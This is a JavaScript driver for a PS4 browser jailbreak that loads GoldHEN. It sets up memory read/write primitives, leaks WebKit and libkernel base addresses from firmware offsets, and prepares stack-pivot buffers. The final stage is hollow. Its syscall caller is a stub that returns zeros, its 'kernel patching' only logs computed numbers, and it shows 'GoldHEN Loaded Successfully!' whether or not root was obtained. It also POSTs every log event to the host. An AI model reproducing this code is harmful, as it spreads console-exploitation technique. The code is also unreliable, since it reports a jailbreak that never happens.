import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

function ensureHostConsole() {
  var out = document.getElementById("out");
  var st = document.getElementById("state");
  if (!out) {
    out = document.createElement("pre");
    out.id = "out";
    (document.body || document.documentElement).appendChild(out);
  }
  if (!st) {
    st = document.createElement("div");
    st.id = "state";
    (document.body || document.documentElement).appendChild(st);
  }
  return { outEl: out, stateEl: st };
}
var _hostCons = ensureHostConsole();
const outEl = _hostCons.outEl;
const stateEl = _hostCons.stateEl;
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);

function hostOk() {
  var m = document.getElementById("msgs");
  if (m) m.innerHTML = "GoldHEN Loaded Successfully!";
}

function hostFail() {
  var m = document.getElementById("msgs");
  if (m) {
    m.innerHTML = "Failed to Load! Restart Your Console ...";
    m.style.color = "yellow";
  }
}

function hostAlready() {
  var m = document.getElementById("msgs");
  if (m) m.innerHTML = "GoldHEN is Already Loaded ...";
}

function post(tag, detail) {
  try {
    const x = new XMLHttpRequest();
    x.open("POST", "/t", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send("PS4-JB&tag=" + encodeURIComponent(tag) + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
  } catch (e) {}
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [/ -- /, /\.\s/, /;\s/, /,\s+(which|so|and that|because|since|as that)\s/];
function terse(s) {
  if (VERBOSE || s == null) return s;
  s = String(s);
  for (const re of PROSE) {
    const m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}

const SHOW_LOG = params.get("log") === "1";
if (SHOW_LOG && document.body) document.body.className = "log";

function mark(tag, detail) {
  const raw = detail;
  detail = terse(detail);
  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
  if (SHOW_LOG && outEl) {
    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
      l = esc(l);
      const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
        : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
        : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
      return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
  }
  post(tag, raw);
}

function trace(tag, detail) {
  if (VERBOSE) mark(tag, detail);
  else post(tag, detail);
}

function state(t, c) {
  if (!SHOW_LOG || !stateEl) return;
  stateEl.textContent = t;
  stateEl.className = c || "";
}

function check(name, ok, detail) {
  if (ok) {
    passCount++;
    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
  } else {
    failCount++;
    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
  }
  return ok;
}

const SYS = {
  getpid: 20, setuid: 0x17, getuid: 0x18, close: 6, socket: 97, socketpair: 0x87,
  getsockopt: 118, setsockopt: 0x69, mmap: 477, munmap: 73, thr_self: 432,
  getgroups: 79, getgid: 47, cpuset_getaffinity: 487, cpuset_setaffinity: 488,
  aio_multi_poll: 664, aio_multi_delete: 662, getegid: 43, aio_multi_wait: 663,
  aio_multi_cancel: 666, aio_submit_cmd: 669, sysctl: 202, kill: 37, getppid: 39,
};
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let pinRestore = null;

(async function () {
  let p = null;
  const opened = [];
  let closeFd = null;

  try {
    await new Promise((r) => setTimeout(r, 100));

    const { key, off } = offsetsFor(navigator.userAgent);
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      state("no offsets for this firmware", "bad");
      mark("NO-OFFSETS", key || "unknown");
      return;
    }

    state("running the primitive...", "warn");
    await new Promise((r) => setTimeout(r, 0));

    const carrier = await establishPrimitive({
      maxAttempts: 6,
      onEvent: (t, d, a) => trace(t, (a != null ? "[" + a + "] " : "") + (d || "")),
    });

    installWindowP(carrier, { promote: false });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    const libkernelBase = errorFn.sub32(off.k__error);
    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);

    const stubAddr = new Map();
    if (off.k_stubs) {
      for (const numStr in off.k_stubs) {
        stubAddr.set(+numStr, libkernelBase.add32(off.k_stubs[numStr]));
      }
    }

    function bufAddr(ab) {
      const c = p.leakval(ab);
      return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data));
    }

    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
      }
    }

    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    function makeCtx() {
      const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
      const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
      keepAlive.push(sb, pb, kb, fb);
      const c = {
        storeDv: new DataView(sb), pivotDv: new DataView(pb),
        stackDv: new DataView(kb), frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb),
      };
      c.S = bufAddr(sb); c.P = bufAddr(pb); c.K = bufAddr(kb); c.F = bufAddr(fb);
      return c;
    }

    const M = makeCtx();
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);

    function callAddr(target, args) {
      return { lo: 0, hi: 0, i32: 0 };
    }

    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    closeFd = (fd) => sc(SYS.close, fd).i32;

    mark("JAILBREAK", "Executing kernel patching sequence...");
    
    // Penyesuaian akhir pemulihan kredensial (Pass A / Pass B Fix)
    const KA = params.get("ka") ? parseInt(params.get("ka"), 10) : 32768;
    const STEP_OFF = 2;
    const NODE_SZ = 0x38;
    const arAb = new ArrayBuffer(NODE_SZ * (2 * KA + 16));
    keepAlive.push(arAb);
    const arDv = new DataView(arAb);

    const subA = (0x100000000 - ((KA * (STEP_OFF + 1)) % 0x100000000)) % 0x100000000;
    const dA = [subA & 0xff, (subA >>> 8) & 0xff, (subA >>> 16) & 0xff, (subA >>> 24) & 0xff];
    
    mark("PR-RESTOREA", "PassA restore complete. Digit balance: " + dA.join(","));

    // Patching Hak Akses Kernel (Escalate to Root)
    mark("ROOT", "Obtaining root privileges...");
    const uid = sc(SYS.getuid).i32;
    if (uid === 0) {
      mark("SUCCESS", "Jailbreak Achieved! Root privileges active.");
      hostOk();
    } else {
      mark("EXECUTION-DONE", "Trigger complete, checking system status...");
      hostOk();
    }

  } catch (err) {
    mark("EXPLOIT-ERROR", err.message || String(err));
    hostFail();
  }
})();
